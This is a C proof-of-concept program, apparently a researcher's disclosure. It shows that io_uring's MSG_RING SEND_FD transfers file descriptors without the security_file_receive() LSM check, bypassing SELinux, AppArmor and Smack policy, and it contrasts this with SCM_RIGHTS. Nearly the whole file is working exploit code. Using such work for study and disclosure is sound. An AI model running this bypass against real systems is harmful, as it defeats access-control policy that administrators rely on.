/*
 * msg_ring_bypass.c — PoC for missing security_file_receive() in io_uring MSG_RING SEND_FD
 *
 * Demonstrates that IORING_OP_MSG_RING with IORING_MSG_SEND_FD transfers
 * file descriptors between io_uring rings WITHOUT calling security_file_receive(),
 * bypassing SELinux, AppArmor, and Smack LSM policy enforcement.
 *
 * Compare: SCM_RIGHTS and IORING_OP_FIXED_FD_INSTALL both call security_file_receive().
 *
 * Usage:
 *   gcc -o msg_ring_bypass msg_ring_bypass.c -luring
 *   ./msg_ring_bypass                    # basic demo
 *   sudo ./msg_ring_bypass --trace       # with bpftrace verification
 *
 * Author: Azizcan Daştan — Milenium Security
 * License: MIT
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <liburing.h>

#define RING_ENTRIES 8
#define FIXED_FILES  4

static const char *COLOR_RED    = "\033[1;31m";
static const char *COLOR_GREEN  = "\033[1;32m";
static const char *COLOR_YELLOW = "\033[1;33m";
static const char *COLOR_CYAN   = "\033[1;36m";
static const char *COLOR_RESET  = "\033[0m";

static void banner(void)
{
    printf("\n%s", COLOR_CYAN);
    printf("  ╔═══════════════════════════════════════════════════════════════╗\n");
    printf("  ║  io_uring MSG_RING SEND_FD — security_file_receive() bypass  ║\n");
    printf("  ║  Missing LSM hook in io_msg_install_complete()               ║\n");
    printf("  ╚═══════════════════════════════════════════════════════════════╝\n");
    printf("%s\n", COLOR_RESET);
}

/*
 * Phase 1: Transfer fd via MSG_RING SEND_FD (NO security_file_receive)
 *
 * Path: io_msg_send_fd() → io_msg_install_complete()
 *       → __io_fixed_fd_install()  ← NO security_file_receive()
 */
static int test_msg_ring_send_fd(const char *filepath)
{
    struct io_uring ring_src, ring_dst;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    int ret, fd, ring_fd_dst;

    printf("%s[Phase 1] MSG_RING SEND_FD (vulnerable path)%s\n", COLOR_YELLOW, COLOR_RESET);

    fd = open(filepath, O_RDONLY);
    if (fd < 0) {
        printf("  [!] Cannot open %s: %s\n", filepath, strerror(errno));
        return -1;
    }
    printf("  [*] Opened target file: %s (fd=%d)\n", filepath, fd);

    /* Initialize source ring with fixed file table */
    ret = io_uring_queue_init(RING_ENTRIES, &ring_src, 0);
    if (ret < 0) {
        printf("  [!] ring_src init failed: %s\n", strerror(-ret));
        close(fd);
        return -1;
    }

    /* Register the fd in source ring's fixed file table at slot 0 */
    ret = io_uring_register_files(&ring_src, &fd, 1);
    if (ret < 0) {
        printf("  [!] register_files failed: %s\n", strerror(-ret));
        close(fd);
        io_uring_queue_exit(&ring_src);
        return -1;
    }
    printf("  [*] Registered fd in source ring fixed table (slot 0)\n");

    /* Initialize destination ring with empty fixed file table */
    ret = io_uring_queue_init(RING_ENTRIES, &ring_dst, 0);
    if (ret < 0) {
        printf("  [!] ring_dst init failed: %s\n", strerror(-ret));
        close(fd);
        io_uring_queue_exit(&ring_src);
        return -1;
    }

    int dummy_fds[FIXED_FILES];
    memset(dummy_fds, -1, sizeof(dummy_fds));
    ret = io_uring_register_files(&ring_dst, dummy_fds, FIXED_FILES);
    if (ret < 0) {
        printf("  [!] dst register_files failed: %s\n", strerror(-ret));
        close(fd);
        io_uring_queue_exit(&ring_src);
        io_uring_queue_exit(&ring_dst);
        return -1;
    }
    printf("  [*] Destination ring ready with %d fixed file slots\n", FIXED_FILES);

    ring_fd_dst = ring_dst.ring_fd;

    /* Submit MSG_RING SEND_FD: transfer fd from src ring slot 0 to dst ring slot 1 */
    sqe = io_uring_get_sqe(&ring_src);
    if (!sqe) {
        printf("  [!] get_sqe failed\n");
        close(fd);
        io_uring_queue_exit(&ring_src);
        io_uring_queue_exit(&ring_dst);
        return -1;
    }

    /* Manual SQE setup for MSG_RING SEND_FD */
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode = IORING_OP_MSG_RING;
    sqe->fd = ring_fd_dst;
    sqe->len = 0;
    sqe->addr = IORING_MSG_SEND_FD;     /* cmd = SEND_FD */
    sqe->addr3 = 0;                      /* src_fd = fixed slot 0 */
    sqe->file_index = 1 + 1;             /* dst_fd = fixed slot 1 (1-indexed) */
    sqe->user_data = 0x1234;

    printf("  [*] Submitting MSG_RING SEND_FD: src_slot=0 → dst_slot=1\n");

    ret = io_uring_submit(&ring_src);
    if (ret < 0) {
        printf("  [!] submit failed: %s\n", strerror(-ret));
        close(fd);
        io_uring_queue_exit(&ring_src);
        io_uring_queue_exit(&ring_dst);
        return -1;
    }

    ret = io_uring_wait_cqe(&ring_src, &cqe);
    if (ret < 0) {
        printf("  [!] wait_cqe failed: %s\n", strerror(-ret));
        close(fd);
        io_uring_queue_exit(&ring_src);
        io_uring_queue_exit(&ring_dst);
        return -1;
    }

    if (cqe->res < 0) {
        printf("  %s[!] MSG_RING SEND_FD failed: %s (res=%d)%s\n",
               COLOR_RED, strerror(-cqe->res), cqe->res, COLOR_RESET);
        io_uring_cqe_seen(&ring_src, cqe);
        close(fd);
        io_uring_queue_exit(&ring_src);
        io_uring_queue_exit(&ring_dst);
        return -1;
    }

    printf("  %s[+] MSG_RING SEND_FD succeeded (res=%d)%s\n",
           COLOR_GREEN, cqe->res, COLOR_RESET);
    printf("  %s[+] File descriptor transferred WITHOUT security_file_receive()!%s\n",
           COLOR_RED, COLOR_RESET);

    io_uring_cqe_seen(&ring_src, cqe);

    /* Verify: read from the transferred fd via destination ring */
    char buf[256] = {0};
    sqe = io_uring_get_sqe(&ring_dst);
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode = IORING_OP_READ;
    sqe->fd = 1;                          /* fixed slot 1 */
    sqe->flags = IOSQE_FIXED_FILE;
    sqe->addr = (unsigned long)buf;
    sqe->len = sizeof(buf) - 1;
    sqe->off = 0;
    sqe->user_data = 0x5678;

    ret = io_uring_submit(&ring_dst);
    if (ret < 0) {
        printf("  [!] read submit failed: %s\n", strerror(-ret));
    } else {
        ret = io_uring_wait_cqe(&ring_dst, &cqe);
        if (ret == 0 && cqe->res > 0) {
            buf[cqe->res] = '\0';
            printf("  %s[+] Read %d bytes from transferred fd: %.60s%s%s\n",
                   COLOR_GREEN, cqe->res, buf, strlen(buf) > 60 ? "..." : "", COLOR_RESET);
        }
        if (ret == 0)
            io_uring_cqe_seen(&ring_dst, cqe);
    }

    close(fd);
    io_uring_queue_exit(&ring_src);
    io_uring_queue_exit(&ring_dst);
    return 0;
}

/*
 * Phase 2: Transfer fd via SCM_RIGHTS (WITH security_file_receive)
 *
 * Path: scm_detach_fds() → receive_fd()
 *       → security_file_receive()  ← SECURITY CHECK PRESENT
 */
static int test_scm_rights(const char *filepath)
{
    int sv[2];
    int fd;
    int ret;

    printf("\n%s[Phase 2] SCM_RIGHTS via Unix socket (correct path)%s\n", COLOR_YELLOW, COLOR_RESET);

    fd = open(filepath, O_RDONLY);
    if (fd < 0) {
        printf("  [!] Cannot open %s: %s\n", filepath, strerror(errno));
        return -1;
    }
    printf("  [*] Opened target file: %s (fd=%d)\n", filepath, fd);

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
        printf("  [!] socketpair failed: %s\n", strerror(errno));
        close(fd);
        return -1;
    }

    /* Send fd via SCM_RIGHTS */
    struct msghdr msg = {0};
    struct cmsghdr *cmsg;
    char buf[CMSG_SPACE(sizeof(int))];
    struct iovec iov;
    char data = 'x';

    iov.iov_base = &data;
    iov.iov_len = 1;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);

    cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(cmsg), &fd, sizeof(int));

    ret = sendmsg(sv[0], &msg, 0);
    if (ret < 0) {
        printf("  [!] sendmsg failed: %s\n", strerror(errno));
        close(fd);
        close(sv[0]);
        close(sv[1]);
        return -1;
    }

    /* Receive fd */
    char recv_data;
    int recv_fd;
    struct msghdr recv_msg = {0};
    struct iovec recv_iov;
    char recv_buf[CMSG_SPACE(sizeof(int))];

    recv_iov.iov_base = &recv_data;
    recv_iov.iov_len = 1;
    recv_msg.msg_iov = &recv_iov;
    recv_msg.msg_iovlen = 1;
    recv_msg.msg_control = recv_buf;
    recv_msg.msg_controllen = sizeof(recv_buf);

    ret = recvmsg(sv[1], &recv_msg, 0);
    if (ret < 0) {
        printf("  [!] recvmsg failed: %s\n", strerror(errno));
        close(fd);
        close(sv[0]);
        close(sv[1]);
        return -1;
    }

    cmsg = CMSG_FIRSTHDR(&recv_msg);
    if (cmsg && cmsg->cmsg_type == SCM_RIGHTS) {
        memcpy(&recv_fd, CMSG_DATA(cmsg), sizeof(int));
        printf("  %s[+] SCM_RIGHTS transfer succeeded (received fd=%d)%s\n",
               COLOR_GREEN, recv_fd, COLOR_RESET);
        printf("  %s[*] security_file_receive() WAS called for this transfer%s\n",
               COLOR_CYAN, COLOR_RESET);
        close(recv_fd);
    }

    close(fd);
    close(sv[0]);
    close(sv[1]);
    return 0;
}

static void print_summary(void)
{
    printf("\n%s", COLOR_CYAN);
    printf("  ╔═══════════════════════════════════════════════════════════════╗\n");
    printf("  ║                        SUMMARY                              ║\n");
    printf("  ╠═══════════════════════════════════════════════════════════════╣\n");
    printf("  ║                                                             ║\n");
    printf("  ║  MSG_RING SEND_FD:  security_file_receive() NOT called      ║\n");
    printf("  ║  SCM_RIGHTS:        security_file_receive() IS called       ║\n");
    printf("  ║  FIXED_FD_INSTALL:  security_file_receive() IS called       ║\n");
    printf("  ║                                                             ║\n");
    printf("  ║  Bug location: io_uring/msg_ring.c:io_msg_install_complete  ║\n");
    printf("  ║  __io_fixed_fd_install() called without LSM check           ║\n");
    printf("  ║                                                             ║\n");
    printf("  ║  Affected LSMs: SELinux, AppArmor, Smack                    ║\n");
    printf("  ║  Impact: fd transfer policy bypass                          ║\n");
    printf("  ║  Affected: Linux 5.18+ (MSG_RING SEND_FD introduction)     ║\n");
    printf("  ╚═══════════════════════════════════════════════════════════════╝\n");
    printf("%s\n", COLOR_RESET);
}

static void usage(const char *prog)
{
    printf("Usage: %s [--trace] [file]\n", prog);
    printf("  --trace   Launch bpftrace to monitor security_file_receive calls\n");
    printf("  file      File to use for fd transfer test (default: /etc/hostname)\n");
}

int main(int argc, char *argv[])
{
    const char *filepath = "/etc/hostname";
    int do_trace = 0;
    pid_t trace_pid = 0;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--trace") == 0)
            do_trace = 1;
        else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            usage(argv[0]);
            return 0;
        } else
            filepath = argv[i];
    }

    banner();

    /* Optionally start bpftrace to monitor security_file_receive calls */
    if (do_trace) {
        printf("%s[*] Starting bpftrace to monitor security_file_receive()...%s\n",
               COLOR_YELLOW, COLOR_RESET);
        trace_pid = fork();
        if (trace_pid == 0) {
            execlp("bpftrace", "bpftrace", "-e",
                   "kprobe:security_file_receive { "
                   "printf(\"  >> security_file_receive called by %s (pid=%d)\\n\", comm, pid); "
                   "}",
                   NULL);
            perror("bpftrace");
            _exit(1);
        }
        sleep(2);
        printf("\n");
    }

    /* Phase 1: MSG_RING — no security_file_receive */
    test_msg_ring_send_fd(filepath);

    /* Phase 2: SCM_RIGHTS — with security_file_receive */
    test_scm_rights(filepath);

    print_summary();

    if (trace_pid > 0) {
        printf("%s[*] Stopping bpftrace...%s\n", COLOR_YELLOW, COLOR_RESET);
        kill(trace_pid, SIGTERM);
        waitpid(trace_pid, NULL, 0);
    }

    return 0;
}
